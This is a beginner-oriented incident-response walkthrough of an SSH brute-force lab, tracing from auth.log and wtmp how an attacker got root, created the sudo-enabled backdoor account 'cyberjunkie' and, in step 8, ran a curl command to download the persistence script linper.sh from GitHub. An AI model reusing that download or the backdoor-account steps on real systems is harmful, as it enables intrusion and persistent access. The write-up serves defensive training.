---
title: "Brutus"
date: 2025-09-21T10:10:00+03:00
draft: false
description: "Beginner's Guide to Unix Log Analysis: SSH Brute Force Investigation"
tags: ["SSH", "Brute Force", "Unix Logs", "auth.log", "wtmp", "Incident Response", "Log Analysis", "MITRE ATT&CK"]
categories: ["SOC", "System Administration", "Incident Response", "Digital Forensics"]
showAuthor: true
showDate: true
showReadingTime: true
showWordCount: true
featureimage: "https://miro.medium.com/1*306f8QKSt4FHzs79x5BHXw.png"
---

## What You'll Learn
This guide walks you through a real cybersecurity investigation where we analyze Unix system logs to track how an attacker broke into a server and what they did afterward. Don't worry if you're new to this - we'll explain everything step by step!

## Background Knowledge

### What are System Logs?
Think of system logs as a detailed diary that your computer keeps. Every time someone logs in, runs a command, or something important happens, the system writes it down with a timestamp.

### Key Log Files We're Using:
- **auth.log**: Records all authentication events (logins, failed attempts, privilege changes)
- **wtmp**: Tracks user login/logout sessions with timestamps

### What is SSH?
SSH (Secure Shell) is like a secure remote control for servers. It lets you control a computer from anywhere on the internet, but it requires a username and password.

### What is a Brute Force Attack?
Imagine someone trying to guess your phone passcode by trying every possible combination. A brute force attack does the same thing - it tries thousands of username/password combinations until it finds one that works.

---

## The Investigation Story

### The Scenario
A company's Confluence server (a collaboration tool) was attacked. The attacker used brute force to break into the SSH service, gained access, and then did more malicious activities. We need to trace their steps using log files.

---

## Step-by-Step Analysis

### Step 1: Finding the Attack Source
**Question**: What IP address did the attacker use?

**Answer**: `65.2.161.68`
You can see the bruteforce attack in play in some of the lines from the logs show below, where we obtained the snippet below, that had the answer:
```
Mar  6 06:31:31 ip-172-31-35-28 sshd[2325]: Invalid user admin from 65.2.161.68 port 46380
    Mar  6 06:31:31 ip-172-31-35-28 sshd[2325]: Received disconnect from 65.2.161.68 port 46380:11: Bye Bye [preauth]
    Mar  6 06:31:31 ip-172-31-35-28 sshd[2325]: Disconnected from invalid user admin 65.2.161.68 port 46380 [preauth]
    Mar  6 06:31:31 ip-172-31-35-28 sshd[620]: error: beginning MaxStartups throttling
    Mar  6 06:31:31 ip-172-31-35-28 sshd[620]: drop connection #10 from [65.2.161.68]:46482 on [172.31.35.28]:22 past MaxStartups
    Mar  6 06:31:31 ip-172-31-35-28 sshd[2327]: Invalid user admin from 65.2.161.68 port 46392
    Mar  6 06:31:31 ip-172-31-35-28 sshd[2327]: pam_unix(sshd:auth): check pass; user unknown
    Mar  6 06:31:31 ip-172-31-35-28 sshd[2327]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.2.161.68 
    Mar  6 06:31:31 ip-172-31-35-28 sshd[2332]: Invalid user admin from 65.2.161.68 port 46444
    Mar  6 06:31:31 ip-172-31-35-28 sshd[2331]: Invalid user admin from 65.2.161.68 port 46436
    Mar  6 06:31:31 ip-172-31-35-28 sshd[2332]: pam_unix(sshd:auth): check pass; user unknown
    Mar  6 06:31:31 ip-172-31-35-28 sshd[2332]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.2.161.68 
    Mar  6 06:31:31 ip-172-31-35-28 sshd[2331]: pam_unix(sshd:auth): check pass; user unknown
```
**What to Look For**:
```
Mar  6 06:31:31 ip-172-31-35-28 sshd[2325]: Invalid user admin from 65.2.161.68 port 46380
Mar  6 06:31:31 ip-172-31-35-28 sshd[2325]: Received disconnect from 65.2.161.68 port 46380:11: Bye Bye [preauth]
```

**Explanation**:
- `Invalid user admin` = Someone tried to log in as "admin" but that user doesn't exist
- `65.2.161.68` = The attacker's IP address (like their internet address)
- `[preauth]` = The connection was closed before successful authentication
- Multiple similar entries = This shows repeated attempts (brute force!)

---

### Step 2: Finding the Successful Break-in
**Question**: Which account did the attacker successfully access?
**Answer**: `root`
You can see the bruteforce attack was successful and has been shown in some of the lines from the logs show below, where we obtained the snippet below, that had the answer:
 ```
    Mar  6 06:31:44 ip-172-31-35-28 sshd[2424]: Connection closed by authenticating user backup 65.2.161.68 port 34856 [preauth]
    Mar  6 06:32:01 ip-172-31-35-28 CRON[2477]: pam_unix(cron:session): session opened for user confluence(uid=998) by (uid=0)
    Mar  6 06:32:01 ip-172-31-35-28 CRON[2476]: pam_unix(cron:session): session opened for user confluence(uid=998) by (uid=0)
    Mar  6 06:32:01 ip-172-31-35-28 CRON[2476]: pam_unix(cron:session): session closed for user confluence
    Mar  6 06:32:01 ip-172-31-35-28 CRON[2477]: pam_unix(cron:session): session closed for user confluence
    Mar  6 06:32:39 ip-172-31-35-28 sshd[620]: exited MaxStartups throttling after 00:01:08, 21 connections dropped
    Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: Accepted password for root from 65.2.161.68 port 53184 ssh2
    Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)
    Mar  6 06:32:44 ip-172-31-35-28 systemd-logind[411]: New session 37 of user root.
 ```

**What to Look For**:
```
Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: Accepted password for root from 65.2.161.68 port 53184 ssh2
Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)
```
**Explanation**:
- `Accepted password for root` = SUCCESS! The attacker got in as the "root" user
- `root` = The most powerful account on Unix systems (like Administrator on Windows)
- `session opened` = A login session was started
- Same IP address `65.2.161.68` confirms this is our attacker

---

### Step 3: When Did They Establish a Working Session?
**Question**: What was the UTC timestamp of the manual login?

**Answer**: `2024-03-06 06:32:45`

Hint: It's important to note that the first successful login by the attacker was the result of an automated brute force attempt, and the session was closed within the same second. After obtaining the working credentials, the attacker manually logged in and established a terminal session, and we need to identify that login. Use the wtmp artifact and the provided `utmp.py` script to view the login time of the working session and correlate that with auth.log. Remember that the timestamp in wtmp will be displayed in your local system time which may not be UTC.

You will need to run a command like:
```
python3 utmp.py wtmp
```
This will help you see the actual logs from the `wtmp` artifact.

**Explanation**:
The first successful login was just an automated script testing credentials. The attacker then manually logged in to actually use the system. We need to find when they established a real working session using the wtmp log file.

---

### Step 4: Session Tracking
**Question**: What session number was assigned to the attacker?

**Answer**: `37`

**What to Look For**:
```
Mar  6 06:32:44 ip-172-31-35-28 systemd-logind[411]: New session 37 of user root.
```

You can actually see this from log snippet in step 2 above.

**Explanation**:
- Each login gets a unique session number
- Session 37 was created for the root user at the time of the successful attack
- This helps us track all activities in this specific session

---

### Step 5: Creating a Backdoor Account
**Question**: What new user account did the attacker create?

**Answer**: `cyberjunkie`

**What to Look for**:
```
Mar  6 06:34:18 ip-172-31-35-28 useradd[2592]: new user: name=cyberjunkie, UID=1002, GID=1002, home=/home/cyberjunkie, shell=/bin/bash
Mar  6 06:35:15 ip-172-31-35-28 usermod[2628]: add 'cyberjunkie' to group 'sudo'
```
From the logs below:
```
    Mar  6 06:34:18 ip-172-31-35-28 groupadd[2586]: group added to /etc/group: name=cyberjunkie, GID=1002
    Mar  6 06:34:18 ip-172-31-35-28 groupadd[2586]: group added to /etc/gshadow: name=cyberjunkie
    Mar  6 06:34:18 ip-172-31-35-28 groupadd[2586]: new group: name=cyberjunkie, GID=1002
    Mar  6 06:34:18 ip-172-31-35-28 useradd[2592]: new user: name=cyberjunkie, UID=1002, GID=1002, home=/home/cyberjunkie, shell=/bin/bash, from=/dev/pts/1
    Mar  6 06:34:26 ip-172-31-35-28 passwd[2603]: pam_unix(passwd:chauthtok): password changed for cyberjunkie
    Mar  6 06:34:31 ip-172-31-35-28 chfn[2605]: changed user 'cyberjunkie' information
    Mar  6 06:35:01 ip-172-31-35-28 CRON[2614]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
    Mar  6 06:35:01 ip-172-31-35-28 CRON[2616]: pam_unix(cron:session): session opened for user confluence(uid=998) by (uid=0)
    Mar  6 06:35:01 ip-172-31-35-28 CRON[2615]: pam_unix(cron:session): session opened for user confluence(uid=998) by (uid=0)
    Mar  6 06:35:01 ip-172-31-35-28 CRON[2614]: pam_unix(cron:session): session closed for user root
    Mar  6 06:35:01 ip-172-31-35-28 CRON[2616]: pam_unix(cron:session): session closed for user confluence
    Mar  6 06:35:01 ip-172-31-35-28 CRON[2615]: pam_unix(cron:session): session closed for user confluence
    Mar  6 06:35:15 ip-172-31-35-28 usermod[2628]: add 'cyberjunkie' to group 'sudo'
    Mar  6 06:35:15 ip-172-31-35-28 usermod[2628]: add 'cyberjunkie' to shadow group 'sudo'
    ```
```
**Explanation**:
- `useradd` = Command to create a new user account
- `usermod` = Command to modify user properties
- `add 'cyberjunkie' to group 'sudo'` = Gave the new account administrator privileges
- This is a "backdoor" - a secret way to get back into the system later

---

### Step 6: Understanding the Attack Technique
**Question**: What MITRE ATT&CK technique was used?

**Answer**: `T1136.001`

**Explanation**:
- MITRE ATT&CK is a framework that catalogs cybersecurity attack techniques
- T1136.001 specifically refers to "Create Account: Local Account" You can find more details here: https://attack.mitre.org/techniques/T1136/001/
- This helps security professionals understand and defend against common attack patterns

---

### Step 7: When Did the First Session End?
**Question**: When did the attacker's first SSH session end?

**Answer**: `2024-03-06 06:37:24`

**What to Look For**:
```
Mar  6 06:37:24 ip-172-31-35-28 sshd[2491]: pam_unix(sshd:session): session closed for user root
Mar  6 06:37:24 ip-172-31-35-28 systemd-logind[411]: Removed session 37.
```

**Beginner Explanation**:
- `session closed` = The login session ended
- Session 37 was removed from the system
- The attacker logged out of their first session

---

### Step 8: Using the Backdoor Account
**Question**: What command did the attacker run using their new privileged account?

**Answer**: `/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh`

**What to Look For**:
```
Mar  6 06:39:38 ip-172-31-35-28 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
```

**Beginner Explanation**:
- The attacker logged back in using their backdoor account "cyberjunkie"
- `sudo` = Command to run something with administrator privileges
- `curl` = Command to download files from the internet
- They downloaded a script called "linper.sh" (likely a malicious tool)

---

## Key Learning Points

### What This Investigation Teaches Us:

1. **Log Analysis is Detective Work**: Every action leaves traces in system logs
2. **Brute Force Attacks Leave Obvious Patterns**: Multiple failed attempts from the same IP
3. **Attackers Create Persistence**: They make backdoor accounts to maintain access
4. **Privilege Escalation**: Getting the most powerful account possible (root)
5. **Covering Their Tracks**: Using their own accounts instead of the original compromised one

### Security Lessons:

1. **Monitor Your Logs**: Regular log analysis can catch attacks early
2. **Strong Password Policies**: Prevent brute force success
3. **Account Monitoring**: Watch for new user accounts being created
4. **Principle of Least Privilege**: Not everyone needs root access
5. **Network Monitoring**: Suspicious downloads should trigger alerts

---

## Tools and Techniques Used

### For Beginners:
- **Text editors** (like nano, vim) to read log files
- **grep** command to search for specific patterns
- **utmp.py** script to analyze wtmp files
- **Basic Linux commands** for file navigation

### Professional Tools:
- **SIEM systems** (Security Information and Event Management)
- **Log analysis platforms** like Splunk or ELK Stack
- **Automated threat detection** systems

---

## Practice Exercises

1. **Find all failed login attempts** in the auth.log
2. **Count how many different usernames** the attacker tried
3. **Calculate the time difference** between first attack attempt and successful login
4. **Identify all commands run by the cyberjunkie account**
5. **Research the MITRE ATT&CK framework** to understand other attack techniques

---

## Next Steps

### To Continue Learning:
1. **Study more log formats** (Apache, Windows Event Logs, etc.)
2. **Learn regular expressions** for better pattern matching
3. **Explore SIEM tools** for automated analysis
4. **Practice with capture-the-flag (CTF)** challenges
5. **Study the MITRE ATT&CK framework** comprehensively

### Recommended Resources:
- **SANS FOR508** (Advanced Incident Response)
- **Linux log analysis tutorials**
- **Cybersecurity blue team training**
- **MITRE ATT&CK Navigator**

---

*Remember: This investigation shows a real attack pattern. Understanding how attackers work helps us defend better!*
